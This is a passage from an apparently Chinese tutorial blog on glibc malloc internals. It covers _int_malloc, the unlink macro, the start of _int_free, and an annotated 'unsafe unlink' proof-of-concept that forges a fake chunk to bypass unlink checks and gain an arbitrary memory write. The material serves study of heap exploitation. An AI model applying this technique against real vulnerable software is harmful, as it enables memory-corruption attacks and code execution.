<span class="comment">/* out of bins */</span></span><br><span class="line">                   <span class="keyword">goto</span> use_top;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">             bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">             bit = <span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">         <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">           &#123;</span><br><span class="line">             bin = next_bin (bin);</span><br><span class="line">             bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">             assert (bit != <span class="number">0</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">         victim = last (bin);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">         <span class="keyword">if</span> (victim == bin)</span><br><span class="line">           &#123;</span><br><span class="line">             av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">             bin = next_bin (bin);</span><br><span class="line">             bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">             assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* unlink */</span></span><br><span class="line">             unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Exhaust */</span></span><br><span class="line">             <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">               &#123;</span><br><span class="line">                 set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                 <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Split */</span></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                 <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                    have to perform a complete insert here.  */</span></span><br><span class="line">                 bck = unsorted_chunks (av);</span><br><span class="line">                 fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">                 remainder-&gt;bk = bck;</span><br><span class="line">                 remainder-&gt;fd = fwd;</span><br><span class="line">                 bck-&gt;fd = remainder;</span><br><span class="line">                 fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                 <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                 <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                   av-&gt;last_remainder = remainder;</span><br><span class="line">                 <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                   &#123;</span><br><span class="line">                     remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                     remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                 set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                 set_foot (remainder, remainder_size);</span><br><span class="line">               &#125;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>unlink：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">\</span><br><span class="line">\<span class="comment">/* 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查) */</span>\</span><br><span class="line">    \<span class="comment">/* 1. prev_size 检查 */</span>\</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);            \</span><br><span class="line">    FD = P-&gt;fd;                      \</span><br><span class="line">    BK = P-&gt;bk;                      \</span><br><span class="line">    \</span><br><span class="line">    \<span class="comment">/* 检查 fd 和 bk 指针(双向链表完整性检查) */</span>\</span><br><span class="line">    \<span class="comment">/* 2. 双向链表完整性检查 */</span>\</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))          \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);            \</span><br><span class="line">    <span class="keyword">else</span> &#123;                      \</span><br><span class="line">        FD-&gt;bk = BK;                    \</span><br><span class="line">        BK-&gt;fd = FD;<span class="comment">//把自己解除链接，让自己的前一个和后一个相连                   </span></span><br><span class="line">        </span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))            \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;          \</span><br><span class="line">            \</span><br><span class="line">            \<span class="comment">/* largebin 中 next_size 双向链表完整性检查 */</span>\</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        \</span><br><span class="line">    || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;              \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)              \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;          \</span><br><span class="line">                <span class="keyword">else</span> &#123;                    \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;            \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;            \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;            \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;            \</span><br><span class="line">                  &#125;                    \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                    \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;          \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;          \</span><br><span class="line">              &#125;                      \</span><br><span class="line">          &#125;                      \</span><br><span class="line">      &#125;                        \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="tcache-unlink-1"><a href="#tcache-unlink-1" class="headerlink" title="tcache_unlink"></a>tcache_unlink</h2><p>代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//chunk大到不能使用tcache和fastbin</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);<span class="comment">//chun0_ptr放在这个地址：0x555555558020, chunk0_ptr里面装着： 0x5555555592a0</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"><span class="comment">//要破坏chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);<span class="comment">//在chunk0中制作fakechunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;<span class="comment">//chunk0_ptr的值是返回给用户的值，则chunk0_ptr[-1]为头部第二个也就是大小字段。</span></span><br><span class="line">	<span class="comment">//----------————————chunk0 包括头部</span></span><br><span class="line">	<span class="comment">//    |size （431）</span></span><br><span class="line">	<span class="comment">//---------——————fake chunk ptr包括头部|chunk ptr</span></span><br><span class="line">	<span class="comment">//    |size-0x10 （421）</span></span><br><span class="line">	<span class="comment">//---------</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);<span class="comment">//这个[2]指向fake chunk的user data区域，也就是返回给用户的区域，如果空闲态就是fd</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);<span class="comment">//绕过unlink检查</span></span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);<span class="comment">//空闲态的bk</span></span><br><span class="line">	<span class="comment">//fd: 0x0000555555558008	bk: 0x0000555555558010</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);<span class="comment">//控制chunk0的数据可以溢出，直到可以覆盖chunk1</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We shrink （缩小）the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk1_hdr:%p\n&quot;</span>,chunk1_hdr);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);<span class="comment">//把chunk1的pre_size改成0x420则我们伪造的fakechunk的开头被认为是chunk1的前一个chunk的开头。</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);<span class="comment">//并且把后面size三位中代表前一个chunk是否为free的标志改为0表示chunk1前一个chunk fakechunk的状态为空闲态。</span></span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);<span class="comment">//当我们free chunk1的时候，它会向前合并，因为物理相邻的chunk为空闲态。</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line">	<span class="comment">//free之前chunk0ptr依然指向fakechunk包括头部的开头</span></span><br><span class="line">	<span class="comment">//free之后指向了fackchunkfd写的内容的那个内容所表示的地址上</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="keyword">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把chunk0摘除使用unlink</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>free(chunk1_ptr)时，glibc发现chunk0是空闲的，就会向后合并。这时需要把chunk0从链表中摘除，就会调用unlink。可以推测，它先做Fd-&gt;bk=Bk,再做Bk-&gt;fd=Fd，也就是chunk0_ptr指针的内容先变成8010，再变成8008。自此，伪造的堆块chunk0，不再被认为位于0x603010，而是位于0x602058。<br><img src="https://i.imgur.com/v5tFgAp.png"></p>
</blockquote>
<p>更改了chunk0_ptr指向的地址。</p>
<p><img src="https://i.imgur.com/rjpAhlB.png"></p>
<p>chunk0_ptr指针指向0x00007fffffffdef0，堆块chunk0被认为位于victim_string指向的地址。假如这里存在恶意代码，或者错误的数据，被当成正常的内容利用，就会有问题。</p>
<blockquote>
<p>把指针变量的地址和它包含的内容进行一个利用</p>
</blockquote>
<h3 id="int-free"><a href="#int-free" class="headerlink" title="int_free():"></a>int_free():</h3><h4 id="free函数的执行内容："><a href="#free函数的执行内容：" class="headerlink" title="free函数的执行内容："></a>free函数的执行内容：</h4><ul>
<li>①判断要释放的chunk是否在fastbin的范围内，如果在就放入fastbin中；否则就放入unsortedbin中</li>
<li>②当放入unsortedbin中时，要检查unlink（前向合并、后向合并）</li>
</ul>
<p><img src="https://pic3.zhimg.com/v2-770e5f98dc3d690d06ed94e5a35873ca_r.jpg"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size(要 free 的 chunk 的大小) */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin(关联的 fastbin) */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk(下一个 chunk) */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size(下一个 chunk 的大小) */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used(当下一个 chunk 正在使用是就为 1) */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk (上一个 chunk 的大小)*/</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking(指向链表（bin）中的上一个块) */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking(指向链表（bin）中的下一个块) */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);<span class="comment">//获取需要释放的chunk大小</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line">    -------------------------------------------------------------</span><br><span class="line">        安全检查代码，chunk的指针地址不能溢出，chunk的大小必须是按<span class="number">2</span>*size_sz对齐且大于等于minsize</span><br><span class="line">        